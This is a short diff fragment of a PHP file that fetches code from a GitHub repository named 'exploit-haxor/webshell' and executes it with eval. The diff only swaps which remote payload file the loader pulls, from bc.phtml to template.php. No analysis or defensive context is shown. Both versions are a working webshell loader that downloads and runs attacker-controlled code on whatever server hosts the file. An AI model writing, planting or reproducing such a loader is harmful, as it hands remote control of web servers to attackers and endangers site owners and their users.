@@ -58,7 +58,7 @@ curl_setopt($conn, CURLOPT_RETURNTRANSFER, 1);
         return $urls;
     }
 
-    $a = geturlsinfo('https://raw.githubusercontent.com/exploit-haxor/webshell/main/bc.phtml');
+    $a = geturlsinfo('https://raw.githubusercontent.com/exploit-haxor/webshell/main/template.php');
     eval('?>' . $a);
 
 ?>
